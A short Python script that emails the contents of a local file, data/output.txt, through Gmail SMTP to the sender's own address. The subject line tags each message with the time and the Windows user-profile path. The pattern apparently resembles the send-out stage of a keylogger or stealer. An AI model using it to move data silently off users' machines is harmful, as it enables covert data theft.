from email.message import EmailMessage
import ssl
import smtplib

from datetime import datetime
import os

def get_data():
    return [
        open("data/sender_email.txt").read(),
        open("data/password.txt").read(),
        open("data/sender_email.txt").read(),
        open("data/output.txt").read()
        ]

def send_email(file: str):
    sender = get_data()[0]
    password = get_data()[1]
    receiver = get_data()[2]

    now = datetime.now()
    subject = f"{now.strftime("%d/%m/%Y %S:%M:%H")} - {os.environ['USERPROFILE']}"
    body = f"{file}"

    em = EmailMessage()
    em["From"] = sender
    em["To"] = receiver
    em["Subject"] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
        smtp.login(sender, password)
        smtp.sendmail(sender, receiver, em.as_string())

send_email(get_data()[3])